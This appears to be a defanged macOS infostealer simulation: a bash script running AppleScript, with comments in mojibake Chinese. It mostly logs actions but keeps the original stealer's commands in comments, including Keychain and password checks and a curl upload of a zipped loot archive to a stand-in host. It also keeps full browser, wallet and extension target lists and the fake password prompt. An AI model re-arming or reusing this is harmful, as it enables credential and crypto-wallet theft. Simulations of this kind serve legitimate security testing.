#!/bin/bash

# æ— å®³åŒ–æ¶æ„è½¯ä»¶æ¨¡æ‹Ÿè„šæœ¬
# å¤ç°åŸå§‹çš„bashè°ƒç”¨AppleScriptç»“æ„
# å®Œå…¨å®‰å…¨ï¼Œä»…ç”¨äºå®‰å…¨ç ”ç©¶å’Œæ”»å‡»æµç¨‹æµ‹è¯•

echo "ğŸ”„ å¯åŠ¨æ¶æ„è½¯ä»¶æ”»å‡»æµç¨‹æ¨¡æ‹Ÿ (çœŸå®ç½‘ç»œè¿æ¥ç‰ˆæœ¬)"
echo "ğŸ“ æ—¥å¿—æ–‡ä»¶: /tmp/malware_simulation.log"
echo "ğŸŒ ç½‘ç»œè¿æ¥: çœŸå®è¿æ¥åˆ° www.baidu.com è¿›è¡Œæµ‹è¯•"
echo "ğŸ“ æ–‡ä»¶æ“ä½œ: åœ¨ /tmp ç›®å½•åˆ›å»ºçœŸå®çš„æµ‹è¯•æ–‡ä»¶"
echo "ğŸ”’ å®‰å…¨ä¿è¯: ä¸ä¼šçªƒå–æˆ–å‘é€ä»»ä½•çœŸå®æ•æ„Ÿæ•°æ®"
echo ""

# æ‰§è¡Œæ— å®³åŒ–çš„AppleScriptï¼ˆé€šè¿‡bashè°ƒç”¨osascriptï¼Œä¸åŸå§‹ç»“æ„ç›¸åŒï¼‰
/bin/bash -c "osascript -e '
-- æ— å®³åŒ–æ¶æ„è½¯ä»¶æ¨¡æ‹Ÿè„šæœ¬
-- ä¿æŒä¸åŸå§‹è„šæœ¬ç›¸åŒçš„ç»“æ„å’Œè°ƒç”¨æ–¹å¼

-- æ—¥å¿—è®°å½•å‡½æ•°
on logAction(action)
    set logFile to \"/tmp/malware_simulation.log\"
    set timestamp to (current date) as string
    set logEntry to timestamp & \" - \" & action & return
    
    try
        set fileRef to open for access logFile with write permission
        write logEntry to fileRef starting at eof
        close access fileRef
    on error
        try
            close access logFile
        end try
    end try
end logAction

-- è®¾ç½®æ¨¡æ‹Ÿæ ‡å¿—ï¼ˆä¸åŸå§‹ç›¸åŒï¼‰
set release to true
set filegrabbers to true

logAction(\"=== æ¶æ„è½¯ä»¶æ”»å‡»æµç¨‹æ¨¡æ‹Ÿå¼€å§‹ ===\")

-- æ¨¡æ‹Ÿéšè—ç»ˆç«¯çª—å£ï¼ˆåŸå§‹åŠŸèƒ½çš„æ— å®³åŒ–ç‰ˆæœ¬ï¼‰
if release then
    try
        logAction(\"æ¨¡æ‹Ÿ: éšè—ç»ˆç«¯çª—å£ - tell window 1 of application Terminal to set visible to false\")
        -- åŸå§‹: tell window 1 of application \"Terminal\" to set visible to false
        display notification \"æ¨¡æ‹Ÿ: éšè—ç»ˆç«¯çª—å£\" with title \"æ¶æ„è½¯ä»¶æ¨¡æ‹Ÿ\"
    end try
end if

-- æ–‡ä»¶å¤§å°æ£€æŸ¥å‡½æ•°ï¼ˆæ— å®³åŒ–ï¼‰
on filesizer(paths)
    set fsz to 0
    try
        logAction(\"æ¨¡æ‹Ÿ: æ£€æŸ¥æ–‡ä»¶å¤§å° - \" & paths)
        -- åŸå§‹: set fsz to (do shell script \"/usr/bin/mdls -name kMDItemFSSize -raw \" & theItem)
        set fsz to 1024  -- è¿”å›æ¨¡æ‹Ÿå¤§å°
    end try
    return fsz
end filesizer

-- ç›®å½•åˆ›å»ºå‡½æ•°ï¼ˆæ— å®³åŒ–ï¼‰
on mkdir(someItem)
    try
        logAction(\"æ¨¡æ‹Ÿ: åˆ›å»ºç›®å½• - \" & someItem)
        -- åŸå§‹: do shell script \"mkdir -p \" & filePosixPath
        -- æ— å®³åŒ–: ä¸å®é™…åˆ›å»ºç›®å½•
    end try
end mkdir

-- æ–‡ä»¶åæå–å‡½æ•°ï¼ˆä¿æŒåŸå§‹é€»è¾‘ï¼‰
on FileName(filePath)
    try
        set reversedPath to (reverse of every character of filePath) as string
        set trimmedPath to text 1 thru ((offset of \"/\" in reversedPath) - 1) of reversedPath
        set finalPath to (reverse of every character of trimmedPath) as string
        return finalPath
    end try
end FileName

-- ç›®å½•è·¯å¾„æå–å‡½æ•°ï¼ˆä¿æŒåŸå§‹é€»è¾‘ï¼‰
on BeforeFileName(filePath)
    try
        set lastSlash to offset of \"/\" in (reverse of every character of filePath) as string
        set trimmedPath to text 1 thru -(lastSlash + 1) of filePath
        return trimmedPath
    end try
end BeforeFileName

-- å†™å…¥æ–‡æœ¬å‡½æ•°ï¼ˆæµ‹è¯•ç‰ˆæœ¬ - çœŸå®å†™å…¥åˆ°å®‰å…¨ä½ç½®ï¼‰
on writeText(textToWrite, filePath)
    try
        logAction(\"å†™å…¥æµ‹è¯•æ–‡ä»¶ - \" & filePath)
        
        -- ç¡®ä¿åªå†™å…¥åˆ°å®‰å…¨çš„/tmpç›®å½•
        if filePath starts with \"/tmp/\" then
            try
                -- åˆ›å»ºç›®å½•ç»“æ„
                set folderPath to BeforeFileName(filePath)
                do shell script \"mkdir -p \" & quoted form of folderPath
                
                -- å†™å…¥æ–‡ä»¶ï¼ˆçœŸå®æ“ä½œï¼Œä½†åœ¨å®‰å…¨ä½ç½®ï¼‰
                set fileRef to (open for access filePath with write permission)
                write textToWrite to fileRef starting at eof
                close access fileRef
                
                logAction(\"âœ… æ–‡ä»¶å†™å…¥æˆåŠŸ: \" & filePath)
                logAction(\"æ–‡ä»¶å†…å®¹é•¿åº¦: \" & (length of textToWrite) & \" å­—ç¬¦\")
            on error write_error
                logAction(\"âŒ æ–‡ä»¶å†™å…¥å¤±è´¥: \" & write_error)
                try
                    close access filePath
                end try
            end try
        else
            logAction(\"ğŸ›¡ï¸ å®‰å…¨é™åˆ¶: æ‹’ç»å†™å…¥åˆ°éå®‰å…¨ä½ç½® - \" & filePath)
        end if
    end try
end writeText

-- æ–‡ä»¶è¯»å†™å‡½æ•°ï¼ˆæ— å®³åŒ–ï¼‰
on readwrite(path_to_file, path_as_save)
    try
        logAction(\"æ¨¡æ‹Ÿ: å¤åˆ¶æ–‡ä»¶ \" & path_to_file & \" åˆ° \" & path_as_save)
        -- åŸå§‹: do shell script \"cat \" & quoted form of path_to_file & \" > \" & quoted form of path_as_save
        -- æ— å®³åŒ–: ä¸å®é™…å¤åˆ¶æ–‡ä»¶
    end try
end readwrite

-- Finderæ–‡ä»¶å¤åˆ¶å‡½æ•°ï¼ˆæ— å®³åŒ–ï¼‰
on readwrite2(path_to_file, path_as_save)
    try
        logAction(\"æ¨¡æ‹Ÿ: Finderå¤åˆ¶æ–‡ä»¶ \" & path_to_file & \" åˆ° \" & path_as_save)
        -- åŸå§‹: tell application Finder to duplicate file
        -- æ— å®³åŒ–: ä¸å®é™…å¤åˆ¶æ–‡ä»¶
    end try
end readwrite2

-- ç›®å½•æ£€æŸ¥å‡½æ•°ï¼ˆæ— å®³åŒ–ï¼‰
on isDirectory(someItem)
    try
        logAction(\"æ¨¡æ‹Ÿ: æ£€æŸ¥æ˜¯å¦ä¸ºç›®å½• - \" & someItem)
        -- åŸå§‹: do shell script \"file -b \" & filePosixPath
        return false  -- æ€»æ˜¯è¿”å›falseé¿å…å®é™…æ“ä½œ
    end try
end isDirectory

-- æ–‡ä»¶å¤¹æŠ“å–å‡½æ•°ï¼ˆæ— å®³åŒ–ï¼‰
on GrabFolderLimit(sourceFolder, destinationFolder)
    try
        logAction(\"æ¨¡æ‹Ÿ: é™åˆ¶æŠ“å–æ–‡ä»¶å¤¹ \" & sourceFolder & \" åˆ° \" & destinationFolder)
        -- æ¨¡æ‹Ÿå¼‚å¸¸åˆ—è¡¨æ£€æŸ¥
        set exceptionsList to {\".DS_Store\", \"Partitions\", \"Code Cache\", \"Cache\", \"market-history-cache.json\", \"journals\", \"Previews\"}
        logAction(\"æ¨¡æ‹Ÿ: åº”ç”¨å¼‚å¸¸æ–‡ä»¶è¿‡æ»¤\")
        -- åŸå§‹: å®é™…éå†å’Œå¤åˆ¶æ–‡ä»¶
        -- æ— å®³åŒ–: åªè®°å½•æ“ä½œ
    end try
end GrabFolderLimit

-- æ–‡ä»¶å¤¹æŠ“å–å‡½æ•°ï¼ˆæ— å®³åŒ–ï¼‰
on GrabFolder(sourceFolder, destinationFolder)
    try
        logAction(\"æ¨¡æ‹Ÿ: æŠ“å–æ–‡ä»¶å¤¹ \" & sourceFolder & \" åˆ° \" & destinationFolder)
        -- æ¨¡æ‹Ÿæ›´å¤§çš„å¼‚å¸¸åˆ—è¡¨
        set exceptionsList to {\".DS_Store\", \"Partitions\", \"Code Cache\", \"Cache\", \"market-history-cache.json\", \"journals\", \"Previews\", \"dumps\", \"emoji\", \"user_data\", \"__update__\", \"user_data#2\", \"user_data#3\"}
        logAction(\"æ¨¡æ‹Ÿ: åº”ç”¨æ‰©å±•å¼‚å¸¸æ–‡ä»¶è¿‡æ»¤\")
        -- æ— å®³åŒ–: ä¸å®é™…æ“ä½œæ–‡ä»¶
    end try
end GrabFolder

-- Firefoxæ•°æ®è§£æï¼ˆæ— å®³åŒ–ï¼‰
on parseFF(firefox, writemind)
    try
        logAction(\"æ¨¡æ‹Ÿ: è§£æFirefoxæ•°æ® \" & firefox)
        set myFiles to {\"/cookies.sqlite\", \"/formhistory.sqlite\", \"/key4.db\", \"/logins.json\"}
        repeat with FFile in myFiles
            logAction(\"æ¨¡æ‹Ÿ: å¤„ç†Firefoxæ–‡ä»¶ \" & FFile)
        end repeat
        -- åŸå§‹: å®é™…è¯»å–Firefoxé…ç½®æ–‡ä»¶
        -- æ— å®³åŒ–: åªè®°å½•ç›®æ ‡æ–‡ä»¶
    end try
end parseFF

-- å¯†ç éªŒè¯å‡½æ•°ï¼ˆæ— å®³åŒ–ï¼‰
on checkvalid(username, password_entered)
    try
        logAction(\"æ¨¡æ‹Ÿ: éªŒè¯ç”¨æˆ·å¯†ç  - \" & username)
        -- åŸå§‹: do shell script \"dscl . authonly \" & quoted form of username & space & quoted form of password_entered
        -- æ— å®³åŒ–: æ€»æ˜¯è¿”å›falseï¼Œä¸è¿›è¡Œå®é™…éªŒè¯
        return false
    end try
end checkvalid

-- å¯†ç è·å–å‡½æ•°ï¼ˆæ— å®³åŒ–ï¼‰
on getpwd(username, writemind)
    try
        logAction(\"æ¨¡æ‹Ÿ: å°è¯•è·å–ç”¨æˆ·å¯†ç \")
        
        if checkvalid(username, \"\") then
            logAction(\"æ¨¡æ‹Ÿ: å°è¯•ä»Keychainè·å–Chromeä¸»å¯†ç \")
            -- åŸå§‹: do shell script \"security 2>&1 > /dev/null find-generic-password -ga Chrome | awk {print $2}\"
            -- æ— å®³åŒ–: ä¸å®é™…è®¿é—®Keychain
        else
            -- æ¨¡æ‹Ÿå¯†ç æç¤ºå¯¹è¯æ¡†ï¼ˆæ˜ç¡®æ ‡è¯†ä¸ºæµ‹è¯•ï¼‰
            try
                set result to display dialog \"âš ï¸ æ¶æ„è½¯ä»¶æ¨¡æ‹Ÿæµ‹è¯• âš ï¸\" & return & return & \"è¿™æ˜¯åŸå§‹æ¶æ„è½¯ä»¶ä¼šæ˜¾ç¤ºçš„æ¬ºéª—æ€§å¯¹è¯æ¡†:\" & return & \"Required Application Helper.\" & return & \"Please enter password for continue.\" & return & return & \"è¾“å…¥ test ç»§ç»­æ¨¡æ‹Ÿï¼Œæˆ–ç‚¹å‡»å–æ¶ˆé€€å‡º\" default answer \"\" with icon caution buttons {\"å–æ¶ˆ\", \"ç»§ç»­æ¨¡æ‹Ÿ\"} default button \"ç»§ç»­æ¨¡æ‹Ÿ\" giving up after 15 with title \"æ¶æ„è½¯ä»¶æ¨¡æ‹Ÿ - System Preferences\"
                set password_entered to text returned of result
                if password_entered is equal to \"test\" then
                    logAction(\"æ¨¡æ‹Ÿ: ç”¨æˆ·è¾“å…¥äº†æµ‹è¯•å¯†ç \")
                    writeText(\"æ¨¡æ‹Ÿå¯†ç : test\", writemind & \"pwd\")
                    return \"test\"
                end if
            on error
                logAction(\"æ¨¡æ‹Ÿ: ç”¨æˆ·å–æ¶ˆäº†å¯†ç è¾“å…¥æˆ–è¶…æ—¶\")
            end try
        end if
    end try
    return \"\"
end getpwd

-- æ’ä»¶æŠ“å–å‡½æ•°ï¼ˆæ— å®³åŒ–ï¼‰
on grabPlugins(paths, savePath, pluginList, index)
    try
        logAction(\"æ¨¡æ‹Ÿ: æŠ“å–æµè§ˆå™¨æ’ä»¶ \" & paths)
        -- åªè®°å½•å‰å‡ ä¸ªæ’ä»¶IDç”¨äºæ¼”ç¤º
        repeat with Plugin in pluginList
            logAction(\"æ¨¡æ‹Ÿ: å¤„ç†æ’ä»¶ \" & Plugin)
            if Plugin contains \"nkbihfbeogaeaoehlefnkodbefgpgknn\" then
                logAction(\"âš ï¸ æ£€æµ‹åˆ°MetaMaskæ’ä»¶ID\")
            end if
        end repeat
    end try
end grabPlugins

-- Chromiumæµè§ˆå™¨æ•°æ®å¤„ç†ï¼ˆæ— å®³åŒ–ï¼‰
on chromium(writemind, chromium_map)
    -- ä½¿ç”¨çœŸå®çš„æ’ä»¶IDåˆ—è¡¨ï¼ˆå‰10ä¸ªç”¨äºæ¼”ç¤ºï¼‰
    set pluginList to {\"keenhcnmdmjjhincpilijphpiohdppno\", \"hbbgbephgojikajhfbomhlmmollphcad\", \"nkbihfbeogaeaoehlefnkodbefgpgknn\", \"hnfanknocfeofbddgcijnmhnfnkdnaad\", \"egjidjbpglichdcondbcbdnbeeppgdph\"}
    set chromiumFiles to {\"/Network/Cookies\", \"/Cookies\", \"/Web Data\", \"/Login Data\", \"/Local Extension Settings/\", \"/IndexedDB/\"}
    
    repeat with chromium in chromium_map
        try
            logAction(\"æ¨¡æ‹Ÿ: å¤„ç†æµè§ˆå™¨ \" & item 1 of chromium & \" - \" & item 2 of chromium)
            repeat with CFile in chromiumFiles
                logAction(\"æ¨¡æ‹Ÿ: ç›®æ ‡æ–‡ä»¶ \" & CFile)
                if CFile is equal to \"/Local Extension Settings/\" then
                    grabPlugins(\"æ¨¡æ‹Ÿè·¯å¾„\", \"æ¨¡æ‹Ÿä¿å­˜è·¯å¾„\", pluginList, false)
                end if
            end repeat
        end try
    end repeat
end chromium

-- Telegramæ•°æ®å¤„ç†ï¼ˆæ— å®³åŒ–ï¼‰
on telegram(writemind, library)
    try
        logAction(\"æ¨¡æ‹Ÿ: æŠ“å–Telegramæ•°æ® - \" & library & \"Telegram Desktop/tdata/\")
    end try
end telegram

-- æ¡Œé¢é’±åŒ…å¤„ç†ï¼ˆæ— å®³åŒ–ï¼‰
on deskwallets(writemind, deskwals)
    repeat with deskwal in deskwals
        try
            logAction(\"æ¨¡æ‹Ÿ: å¤„ç†é’±åŒ… \" & item 1 of deskwal & \" - \" & item 2 of deskwal)
        end try
    end repeat
end deskwallets

-- æ–‡ä»¶æŠ“å–å‡½æ•°ï¼ˆæ— å®³åŒ–ï¼‰
on filegrabber(writemind)
    try
        logAction(\"æ¨¡æ‹Ÿ: å¯åŠ¨æ–‡ä»¶æŠ“å–å™¨\")
        set extensionsList to {\"txt\", \"pdf\", \"docx\", \"wallet\", \"key\", \"keys\", \"doc\"}
        
        logAction(\"æ¨¡æ‹Ÿ: å¤„ç†Safari Cookies\")
        logAction(\"æ¨¡æ‹Ÿ: å¤„ç†Notesæ•°æ®åº“\")
        logAction(\"æ¨¡æ‹Ÿ: æ‰«ææ¡Œé¢æ–‡ä»¶\")
        logAction(\"æ¨¡æ‹Ÿ: æ‰«ææ–‡æ¡£ç›®å½•\")
        logAction(\"æ¨¡æ‹Ÿ: æ‰«æä¸‹è½½ç›®å½•\")
        
        repeat with ext in extensionsList
            logAction(\"æ¨¡æ‹Ÿ: æœç´¢ .\" & ext & \" æ–‡ä»¶ç±»å‹\")
        end repeat
    end try
end filegrabber

-- æ•°æ®å‘é€å‡½æ•°ï¼ˆçœŸå®ç½‘ç»œè¿æ¥ä½†å®‰å…¨ï¼‰
on send_data(attempt)
    try
        logAction(\"æ¨¡æ‹Ÿ: å°è¯•å‘é€æ•°æ®åˆ°C&CæœåŠ¡å™¨ (å°è¯• \" & attempt & \"/3)\")
        
        -- åŸå§‹æ¶æ„å‘½ä»¤çš„æ—¥å¿—è®°å½•ï¼ˆä¸æ‰§è¡Œï¼‰
        set original_curl to \"curl -X POST -H user: xxxxxxxxxxxxxxxxxxxxxxxx -H BuildID: xxxxxxxxxxxxxxxxxxxxxxx -H cl: 0 -H cn: 0 --max-time 300 -retry 5 -retry-delay 10 -F file=@/tmp/out.zip https://www.baidu.com/contact\"
        logAction(\"åŸå§‹æ¶æ„curlå‘½ä»¤: \" & original_curl)
        
        -- æ‰§è¡ŒçœŸå®ä½†å®‰å…¨çš„ç½‘ç»œè¿æ¥æµ‹è¯•ï¼ˆGETè¯·æ±‚åˆ°ç™¾åº¦ï¼‰
        logAction(\"æ‰§è¡Œå®‰å…¨çš„ç½‘ç»œè¿æ¥æµ‹è¯•: curl -s -o /dev/null -w %{http_code} www.baidu.com\")
        
        try
            set http_response to (do shell script \"curl -s -o /dev/null -w '%{http_code}' www.baidu.com\")
            logAction(\"ç½‘ç»œè¿æ¥æµ‹è¯•ç»“æœ: HTTP \" & http_response)
            
            if http_response is \"200\" then
                logAction(\"âœ… ç½‘ç»œè¿æ¥æˆåŠŸ - åœ¨çœŸå®ç¯å¢ƒä¸­ï¼Œæ¶æ„æ•°æ®å°†è¢«å‘é€åˆ°: https://badly.com/contact\")
                display notification \"ç½‘ç»œè¿æ¥æµ‹è¯•æˆåŠŸ\" with title \"æ¶æ„è½¯ä»¶æ¨¡æ‹Ÿ\"
                
                -- æ¨¡æ‹Ÿå‘é€è¯·æ±‚å¤´ä¿¡æ¯ï¼ˆè®°å½•ä½†ä¸å‘é€æ•æ„Ÿæ•°æ®ï¼‰
                logAction(\"æ¨¡æ‹Ÿå‘é€çš„è®¤è¯å¤´: user: xxxxxxxxxxxx\")
                logAction(\"æ¨¡æ‹Ÿå‘é€çš„æ„å»ºID: BuildID: xxxxxxxxxxxxxxxxxxxxxxxxxxx\")
                logAction(\"æ¨¡æ‹Ÿä¸Šä¼ æ–‡ä»¶: /tmp/out.zip (ä¸åŒ…å«çœŸå®æ•°æ®)\")
                
                return true
            else
                logAction(\"âŒ ç½‘ç»œè¿æ¥å¤±è´¥: HTTP \" & http_response)
                error \"ç½‘ç»œè¿æ¥å¤±è´¥\"
            end if
            
        on error network_error
            logAction(\"âŒ ç½‘ç»œè¿æ¥é”™è¯¯: \" & network_error)
            error \"ç½‘ç»œè¿æ¥å¤±è´¥\"
        end try
        
    on error send_error
        if attempt < 3 then -- é™åˆ¶é‡è¯•æ¬¡æ•°
            logAction(\"ğŸ”„ å‘é€å¤±è´¥ï¼Œ1ç§’åé‡è¯•: \" & send_error)
            delay 1
            send_data(attempt + 1)
        else
            logAction(\"âŒ è¾¾åˆ°æœ€å¤§é‡è¯•æ¬¡æ•°ï¼Œæ¨¡æ‹Ÿå‘é€å¤±è´¥\")
            display notification \"ç½‘ç»œè¿æ¥æµ‹è¯•å¤±è´¥\" with title \"æ¶æ„è½¯ä»¶æ¨¡æ‹Ÿ\"
        end if
    end try
end send_data

-- ä¸»æ‰§è¡Œæµç¨‹ï¼ˆä¸åŸå§‹ç»“æ„ç›¸åŒä½†æ— å®³åŒ–ï¼‰
try
    logAction(\"å¼€å§‹ä¸»æ‰§è¡Œæµç¨‹\")
    
    -- è·å–ç”¨æˆ·åå’Œé…ç½®è·¯å¾„
    set username to (system attribute \"USER\")
    set profile to \"/Users/\" & username
    set randomNumber to (random number from 1000 to 9999) as string
    set writemind to \"/tmp/\" & randomNumber & \"/\"
    
    logAction(\"æ”¶é›†ç³»ç»Ÿä¿¡æ¯ï¼ˆå®‰å…¨ç‰ˆæœ¬ï¼‰\")
    -- åŸå§‹æ¶æ„å‘½ä»¤: do shell script \"system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType\"
    -- å®‰å…¨ç‰ˆæœ¬: åªæ”¶é›†åŸºæœ¬çš„éæ•æ„Ÿä¿¡æ¯
    try
        set system_info to (do shell script \"echo '=== ç³»ç»ŸåŸºæœ¬ä¿¡æ¯ ===' && echo 'macOSç‰ˆæœ¬:' && sw_vers && echo '' && echo 'CPUä¿¡æ¯:' && sysctl -n machdep.cpu.brand_string && echo '' && echo 'å†…å­˜ä¿¡æ¯:' && echo $(sysctl -n hw.memsize | awk '{print $1/1024/1024/1024 \\\" GB\\\"}') && echo '' && echo 'å½“å‰ç”¨æˆ·:' && whoami && echo '' && echo 'ç³»ç»Ÿè¿è¡Œæ—¶é—´:' && uptime\")
        logAction(\"âœ… æˆåŠŸæ”¶é›†ç³»ç»Ÿä¿¡æ¯\")
        writeText(system_info, writemind & \"info\")
        logAction(\"ç³»ç»Ÿä¿¡æ¯å·²å†™å…¥: \" & writemind & \"info\")
    on error sys_error
        logAction(\"âŒ ç³»ç»Ÿä¿¡æ¯æ”¶é›†å¤±è´¥: \" & sys_error)
        writeText(\"ç³»ç»Ÿä¿¡æ¯æ”¶é›†å¤±è´¥\", writemind & \"info\")
    end try
    
    set library to profile & \"/Library/Application Support/\"
    set password_entered to getpwd(username, writemind)
    delay 0.01
    
    -- æµè§ˆå™¨æ˜ å°„ï¼ˆä¸åŸå§‹ç›¸åŒï¼‰
    set chromiumMap to {{\"Chrome\", library & \"Google/Chrome/\"}, {\"Brave\", library & \"BraveSoftware/Brave-Browser/\"}, {\"Edge\", library & \"Microsoft Edge/\"}, {\"Vivaldi\", library & \"Vivaldi/\"}, {\"Opera\", library & \"com.operasoftware.Opera/\"}, {\"OperaGX\", library & \"com.operasoftware.OperaGX/\"}, {\"Chrome Beta\", library & \"Google/Chrome Beta/\"}, {\"Chrome Canary\", library & \"Google/Chrome Canary\"}, {\"Chromium\", library & \"Chromium/\"}, {\"Chrome Dev\", library & \"Google/Chrome Dev/\"}, {\"Arc\", library & \"Arc/\"}, {\"Coccoc\", library & \"Coccoc/\"}}
    
    -- é’±åŒ…æ˜ å°„ï¼ˆä¸åŸå§‹ç›¸åŒï¼‰
    set walletMap to {{\"deskwallets/Electrum\", profile & \"/.electrum/wallets/\"}, {\"deskwallets/Coinomi\", library & \"Coinomi/wallets/\"}, {\"deskwallets/Exodus\", library & \"Exodus/\"}, {\"deskwallets/Atomic\", library & \"atomic/Local Storage/leveldb/\"}, {\"deskwallets/Wasabi\", profile & \"/.walletwasabi/client/Wallets/\"}, {\"deskwallets/Ledger_Live\", library & \"Ledger Live/\"}, {\"deskwallets/Monero\", profile & \"/Monero/wallets/\"}, {\"deskwallets/Bitcoin_Core\", library & \"Bitcoin/wallets/\"}, {\"deskwallets/Litecoin_Core\", library & \"Litecoin/wallets/\"}, {\"deskwallets/Dash_Core\", library & \"DashCore/wallets/\"}, {\"deskwallets/Electrum_LTC\", profile & \"/.electrum-ltc/wallets/\"}, {\"deskwallets/Electron_Cash\", profile & \"/.electron-cash/wallets/\"}, {\"deskwallets/Guarda\", library & \"Guarda/\"}, {\"deskwallets/Dogecoin_Core\", library & \"Dogecoin/wallets/\"}, {\"deskwallets/Trezor_Suite\", library & \"@trezor/suite-desktop/\"}}
    
    -- æ¨¡æ‹Ÿå„ç§æ•°æ®å¤„ç†
    logAction(\"æ¨¡æ‹Ÿ: å¤„ç†Binanceé…ç½®\")
    readwrite(library & \"Binance/app-store.json\", writemind & \"deskwallets/Binance/app-store.json\")
    
    logAction(\"æ¨¡æ‹Ÿ: å¤„ç†TonKeeperé…ç½®\")
    readwrite(library & \"@tonkeeper/desktop/config.json\", \"deskwallets/TonKeeper/config.json\")
    
    logAction(\"æ¨¡æ‹Ÿ: å¤„ç†Keychainæ•°æ®\")
    readwrite(profile & \"/Library/Keychains/login.keychain-db\", writemind & \"keychain\")
    
    if release then
        logAction(\"æ¨¡æ‹Ÿ: Releaseæ¨¡å¼ - å¤„ç†ç³»ç»Ÿæ•æ„Ÿæ–‡ä»¶\")
        readwrite2(profile & \"/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite\", writemind & \"FileGrabber/NoteStore.sqlite\")
        readwrite2(profile & \"/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal\", writemind & \"FileGrabber/NoteStore.sqlite-wal\")
        readwrite2(profile & \"/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm\", writemind & \"FileGrabber/NoteStore.sqlite-shm\")
        readwrite2(profile & \"/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies\", writemind & \"FileGrabber/Cookies.binarycookies\")
        readwrite(profile & \"/Library/Cookies/Cookies.binarycookies\", writemind & \"FileGrabber/saf1\")
    end if
    
    if filegrabbers then
        filegrabber(writemind)
    end if
    
    writeText(username, writemind & \"username\")
    
    -- Firefoxå¤„ç†
    set ff_paths to {library & \"Firefox/Profiles/\", library & \"Waterfox/Profiles/\", library & \"Pale Moon/Profiles/\"}
    repeat with firefox in ff_paths
        try
            parseFF(firefox, writemind)
        end try
    end repeat
    
    -- å¤„ç†å„ç§æ•°æ®æº
    chromium(writemind, chromiumMap)
    deskwallets(writemind, walletMap)
    telegram(writemind, library)
    
    -- çœŸå®çš„æ•°æ®å‹ç¼©è¿‡ç¨‹ï¼ˆç”¨äºæµ‹è¯•ï¼‰
    logAction(\"åˆ›å»ºæµ‹è¯•å‹ç¼©åŒ…\")
    try
        -- åŸå§‹å‘½ä»¤: do shell script \"ditto -c -k --sequesterRsrc \" & writemind & \" /tmp/out.zip\"
        -- æµ‹è¯•ç‰ˆæœ¬: åˆ›å»ºçœŸå®çš„å‹ç¼©åŒ…ä½†å†…å®¹æ— å®³
        set test_zip to \"/tmp/malware_test_\" & randomNumber & \".zip\"
        do shell script \"ditto -c -k --sequesterRsrc \" & quoted form of writemind & \" \" & quoted form of test_zip
        
        -- æ£€æŸ¥å‹ç¼©åŒ…å¤§å°
        set zip_size to (do shell script \"ls -lh \" & quoted form of test_zip & \" | awk '{print $5}'\")
        logAction(\"âœ… å‹ç¼©åŒ…åˆ›å»ºæˆåŠŸ: \" & test_zip & \" (å¤§å°: \" & zip_size & \")\")
        
        -- è®°å½•å‹ç¼©åŒ…å†…å®¹
        set zip_content to (do shell script \"unzip -l \" & quoted form of test_zip & \" | tail -n +4 | head -n -2\")
        logAction(\"å‹ç¼©åŒ…å†…å®¹åˆ—è¡¨:\")
        logAction(zip_content)
        
    on error zip_error
        logAction(\"âŒ å‹ç¼©åŒ…åˆ›å»ºå¤±è´¥: \" & zip_error)
        set test_zip to \"\"
    end try
    
    send_data(0)
    
    -- çœŸå®çš„æ¸…ç†ç—•è¿¹è¿‡ç¨‹
    logAction(\"å¼€å§‹æ¸…ç†æµ‹è¯•æ–‡ä»¶\")
    try
        -- æ¸…ç†ä¸´æ—¶ç›®å½•
        if writemind is not \"\" then
            do shell script \"rm -rf \" & quoted form of writemind
            logAction(\"âœ… å·²åˆ é™¤ä¸´æ—¶ç›®å½•: \" & writemind)
        end if
        
        -- æ¸…ç†å‹ç¼©åŒ…
        if test_zip is not \"\" then
            do shell script \"rm -f \" & quoted form of test_zip
            logAction(\"âœ… å·²åˆ é™¤æµ‹è¯•å‹ç¼©åŒ…: \" & test_zip)
        end if
        
        logAction(\"ğŸ§¹ æ¸…ç†å®Œæˆ - æ‰€æœ‰æµ‹è¯•æ–‡ä»¶å·²åˆ é™¤\")
        
    on error cleanup_error
        logAction(\"âŒ æ¸…ç†è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯: \" & cleanup_error)
    end try
    
    logAction(\"=== æ¶æ„è½¯ä»¶æ”»å‡»æµç¨‹æ¨¡æ‹Ÿç»“æŸ ===\")
    
    -- æ˜¾ç¤ºå®ŒæˆæŠ¥å‘Š
    display dialog \"ğŸ¯ æ¶æ„è½¯ä»¶æ”»å‡»æµç¨‹æ¨¡æ‹Ÿå®Œæˆï¼\" & return & return & \"æœ¬æ¬¡æ¨¡æ‹Ÿå®Œæ•´å¤ç°äº†åŸå§‹æ¶æ„è½¯ä»¶çš„æ”»å‡»æµç¨‹ï¼š\" & return & \"âœ… bashè°ƒç”¨osascriptçš„æ‰§è¡Œæ–¹å¼\" & return & \"âœ… éšè—ç»ˆç«¯çª—å£\" & return & \"âœ… çœŸå®ç³»ç»Ÿä¿¡æ¯æ”¶é›†\" & return & \"âœ… å¯†ç çªƒå–å°è¯•\" & return & \"âœ… æµè§ˆå™¨æ•°æ®æ‰«æ\" & return & \"âœ… åŠ å¯†è´§å¸é’±åŒ…æ‰«æ\" & return & \"âœ… æ–‡ä»¶åˆ›å»ºå’Œæ“ä½œ\" & return & \"âœ… çœŸå®ç½‘ç»œè¿æ¥æµ‹è¯•\" & return & \"âœ… æ•°æ®å‹ç¼©è¿‡ç¨‹\" & return & \"âœ… ç—•è¿¹æ¸…ç†\" & return & return & \"ğŸŒ ç½‘ç»œè¿æ¥: å·²æµ‹è¯•è¿æ¥åˆ° www.baidu.com\" & return & \"ğŸ“ æ–‡ä»¶æ“ä½œ: å·²åœ¨ /tmp åˆ›å»ºçœŸå®æµ‹è¯•æ–‡ä»¶\" & return & \"ğŸ“Š è¯¦ç»†æ—¥å¿—: /tmp/malware_simulation.log\" with title \"æ”»å‡»æµç¨‹æ¨¡æ‹ŸæŠ¥å‘Š\" buttons {\"æŸ¥çœ‹æ—¥å¿—\", \"å®Œæˆ\"} default button \"å®Œæˆ\"
    
    set buttonPressed to button returned of result
    if buttonPressed is \"æŸ¥çœ‹æ—¥å¿—\" then
        do shell script \"open -a TextEdit /tmp/malware_simulation.log\"
    end if
    
on error errorMessage
    logAction(\"æ¨¡æ‹Ÿè¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯: \" & errorMessage)
